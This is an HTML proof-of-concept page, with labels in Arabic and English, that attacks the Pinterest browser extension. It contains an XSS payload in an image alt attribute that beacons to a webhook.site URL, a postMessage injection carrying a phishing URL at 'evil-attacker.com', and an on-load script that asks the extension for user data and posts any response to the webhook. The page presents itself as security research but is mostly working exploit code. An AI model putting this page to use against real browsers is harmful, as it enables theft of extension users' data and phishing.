<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Security Research - Pinterest Extension PoC</title>
    <style>
        body { font-family: sans-serif; line-height: 1.6; padding: 20px; background: #f0f2f5; color: #1c1e21; }
        .container { max-width: 800px; margin: auto; background: white; padding: 30px; border-radius: 12px; box-shadow: 0 5px 15px rgba(0,0,0,0.1); }
        h1 { color: #e60023; border-bottom: 2px solid #eee; padding-bottom: 10px; }
        .exploit-box { background: #fff4f4; border-left: 5px solid #e60023; padding: 15px; margin: 20px 0; }
        .target-img { width: 300px; border-radius: 8px; cursor: pointer; border: 3px dashed #ccc; transition: 0.3s; }
        .target-img:hover { border-color: #e60023; transform: scale(1.01); }
        #status { font-family: monospace; background: #222; color: #0f0; padding: 15px; border-radius: 5px; height: 150px; overflow-y: auto; }
    </style>
</head>
<body>

<div class="container">
    <h1>Pinterest Extension Vulnerability Lab</h1>
    <p>هذه الصفحة مصممة لاختبار الثغرات الأمنية في إضافة Pinterest (v6.12.0) وإرسال النتائج للتحقق.</p>

    <div class="exploit-box">
        <h3>1. اختبار XSS via Image Metadata</h3>
        <p>مرر الماوس فوق الصورة واضغط على زر Pinterest (إذا كان الكود مصاباً سيتم تنفيذ JavaScript).</p>
        <img src="https://picsum.photos/400/300" 
             alt='"><img src=x onerror="fetch(`https://webhook.site/f2574412-4c58-4c01-ad4c-67882c509104?type=XSS_SUCCESS`)">' 
             class="target-img">
    </div>

    <div class="exploit-box">
        <h3>2. اختبار PostMessage Data Injection</h3>
        <button onclick="triggerPostMessage()">تشغيل حقن البيانات (PostMessage)</button>
    </div>

    <div id="status">> جاهز للاختبار...</div>
</div>

<script>
    const WEBHOOK_URL = "https://webhook.site/f2574412-4c58-4c01-ad4c-67882c509104";
    const EXTENSION_ID = "gpdjojdkbbmdfjfahjcgigfpmkopogic";
    const logDiv = document.getElementById('status');

    function report(msg, data = {}) {
        logDiv.innerHTML += `<br>> ${msg}`;
        fetch(`${WEBHOOK_URL}?log=${encodeURIComponent(msg)}`, {
            method: 'POST',
            body: JSON.stringify(data)
        });
    }

    // --- تجربة الثغرة 1: PostMessage Injection ---
    function triggerPostMessage() {
        report("جاري محاولة حقن رسالة خبيثة عبر window.postMessage...");
        window.postMessage({
            type: "PINTEREST_SAVE",
            data: {
                url: "https://evil-attacker.com/phishing",
                src: "https://picsum.photos/200/200",
                description: "This data was injected via an external site!",
                isThroughExtension: true
            }
        }, "*");
    }

    // --- تجربة الثغرة 2: External Messaging (Cross-Extension) ---
    async function testExternalMessaging() {
        if (typeof chrome !== "undefined" && chrome.runtime && chrome.runtime.sendMessage) {
            report("محاولة التواصل المباشر مع Background Script...");
            chrome.runtime.sendMessage(EXTENSION_ID, { action: "FETCH_USER" }, (response) => {
                if (chrome.runtime.lastError) {
                    report("فشل الاتصال المباشر (قد تكون الحماية مفعلة): " + chrome.runtime.lastError.message);
                } else {
                    report("نجاح! تم سحب بيانات المستخدم!", response);
                }
            });
        }
    }

    // تشغيل الاختبارات التلقائية عند التحميل
    window.onload = () => {
        testExternalMessaging();
    };
</script>

</body>
</html>
